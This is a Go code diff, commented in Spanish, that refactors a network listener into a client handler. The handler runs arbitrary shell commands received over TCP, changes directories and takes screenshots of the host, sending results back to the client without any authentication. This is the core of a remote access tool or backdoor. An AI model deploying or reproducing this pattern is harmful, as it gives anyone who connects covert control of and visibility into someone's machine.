@@ -127,69 +127,79 @@ func Envio(conexion net.Conn, salida []byte) error {
 	return nil
 }
 
-var ch_error = make(chan error)
-var ch_salida = make(chan []byte)
-
 func Escucha(conn net.Listener) {
 	for {
-		buffer := make([]byte, TAMAÑO_BUFFER)
 
 		cliente, error := conn.Accept()
 		if error != nil {
 			fmt.Println(error)
 		}
+		Cliente(cliente)
+	}
+}
 
-		n, error := cliente.Read(buffer) //recibir el paquete del cliente
-		if error != nil {
-			fmt.Println(error)
+// maneja los comandos que llegan del cliente
+func Cliente(cliente net.Conn) {
+
+	defer cliente.Close()
+
+	buffer := make([]byte, TAMAÑO_BUFFER)
+	n, err := cliente.Read(buffer) //recibir el paquete del cliente
+	if err != nil {
+		fmt.Println(err)
+	}
+	entrada := string(buffer[:n]) // trasformar el paquete en string
+
+	match, _ := regexp.Match("cd ", []byte(entrada))
+	if match { // logica de cd
+		Cd(entrada, cliente)
+
+	} else if entrada == "ss" { // logica de ss
+
+		err := Ss(cliente)
+		if err != nil {
+			fmt.Println("error al hacer screenshot: ", err)
 		}
-		entrada := string(buffer[:n]) // trasformar el paquete en string
+	} else if entrada == "q" {
+		fmt.Println("[!] cliente desconectado")
+		return
 
-		match, _ := regexp.Match("cd ", []byte(entrada))
-		if match { // logica de cd
-			Cd(entrada, cliente)
+	} else { // ejecucion de cualquier otro comando
 
-		} else if entrada == "ss" { // logica de ss
+		var ch_error = make(chan error)   // gestiona errores
+		var ch_salida = make(chan []byte) // gestiona salidas de comando
 
-			error := Ss(cliente)
-			if error != nil {
-				fmt.Println("error al hacer screenshot: ", error)
+		contexto, cancelar := context.WithTimeout(context.Background(), time.Second*5)
+
+		defer cancelar()
+
+		go func() {
+			salida, err := Ejecucion(entrada)
+
+			if err != nil {
+				ch_error <- err
+			} else {
+				ch_salida <- salida
 			}
 
-		} else { // ejecucion de cualquier otro comando
+		}()
 
-			contexto, cancelar := context.WithTimeout(context.Background(), time.Second*5)
+		select {
+		case <-contexto.Done():
+			Envio(cliente, []byte("[!] tiempo de ejecucion agotado"))
 
-			defer cancelar()
+		case salida := <-ch_salida:
 
-			go func() {
-				salida, error := Ejecucion(entrada)
+			err := Envio(cliente, salida)
 
-				if error != nil {
-					ch_error <- error
-				} else {
-					ch_salida <- salida
-				}
-
-			}()
-
-			select {
-			case <-contexto.Done():
-				Envio(cliente, []byte("[!] tiempo de ejecucion agotado"))
-
-			case salida := <-ch_salida:
-
-				err := Envio(cliente, salida)
-
-				if err != nil {
-					fmt.Println("hubo un problema al enviar")
-				}
-
-			case err := <-ch_error:
-
-				fmt.Println("hubo un problema ", err)
+			if err != nil {
+				fmt.Println("hubo un problema al enviar")
 			}
 
+		case err := <-ch_error:
+
+			fmt.Println("hubo un problema ", err)
 		}
+
 	}
 }
